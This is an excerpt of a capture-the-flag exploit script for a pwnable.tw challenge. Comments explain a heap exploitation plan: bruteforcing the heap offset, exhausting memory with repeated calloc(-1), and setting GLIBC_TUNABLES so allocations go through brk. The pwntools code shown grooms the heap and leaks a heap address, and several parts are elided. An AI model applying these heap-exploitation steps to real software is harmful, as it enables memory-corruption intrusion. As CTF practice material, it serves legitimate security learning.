###An additional heap_offset bruteforcing compared to version alpha
###ulimit -v settings matters!!(while on my testing machines, memory usages are all unlimited, the remote environment has one small enoungh to make calloc(0xffffffff) fail, which means the strtok attack is still appliable)

###Another more reliable attack route is to continuously calloc(-1) until system runs out of memory
#  This way of exploitation could meet certain problems, namely, mmaped memory would be released on free
#  To circumvent this problem, we must utilize the wrapper and set some GLIBC_TUNABLES=glibc.malloc.mmap_map=0, which forces all memory allocation to be done with brk
#  This allows us to perform multiple calloc(-1) and gradually exhaust memory
...
while True:
    try:
        r = remote('chall.pwnable.tw',10410)
        ...
        guess_heap_offset = 0x1000
        print(hex(0x12c00-(guess_heap_offset&0xf000)-0x650-0x150-0x420-0x130-0x8))
        create_vuln(0,0,'pad',0,0x10000-(guess_heap_offset&0xf000)-0x650-0x150-0x8,'pad\x00')
        ...
        delete_type(0x18,'DoS')
        heap_addr = u64(show_vuln(0)[1]['title']+b'\x00\x00')-0x510
        if heap_addr&0xfff!=0 or heap_addr&0xf000!=guess_heap_offset:
            print('Fail')
            exit()
        print(hex(heap_addr))
